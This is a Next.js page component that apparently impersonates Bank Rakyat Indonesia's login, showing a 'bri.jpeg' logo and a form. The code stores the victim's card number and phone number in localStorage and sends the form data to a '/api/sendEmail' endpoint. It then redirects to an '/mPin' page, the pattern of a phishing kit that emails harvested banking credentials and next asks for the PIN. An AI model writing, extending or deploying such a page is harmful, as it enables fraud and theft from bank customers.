import React from 'react'
import SiteImage from '../components/SiteImage'
import SiteForm from '../components/SiteForm'

import logo from "../public/bri.jpeg"
import { useRouter } from 'next/router'

const NoAkun = ({host}) => {
    const router = useRouter()

    const handleLogin = async (data) => {

        localStorage.setItem('noKartu', data.nomorkartu)
        localStorage.setItem('noHp', data.nomorhandphone)

        document.getElementById('btn').innerHTML = 'Loading...'

        try {
            
            const response = await fetch('/api/sendEmail', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'url': host
                },
                body: JSON.stringify(data)
            })

            const json = await response.json()
            
            if (json.status === 200) {
                document.getElementById('btn').innerHTML = 'Lanjut'
                router.push('/mPin')
            } else{
                document.getElementById('btn').innerHTML = 'Lanjut'
                console.log(json.error)
            }

        } catch (error) {
            document.getElementById('btn').innerHTML = 'Lanjut'
            console.log(error.message);
        }
    }

    return (
        <div className="container">
            <div className='container-flex'>
                <SiteImage logo={logo} type="login"/>      
                <SiteForm jenis="norek"
                    btnClick={(data) => handleLogin(data)}
                />
            </div>
        </div>
    )
}

export async function getServerSideProps(context) {

    const host = context.req.headers.host
    
    return {
      props: {
        host
      },
    }
  }

export default NoAkun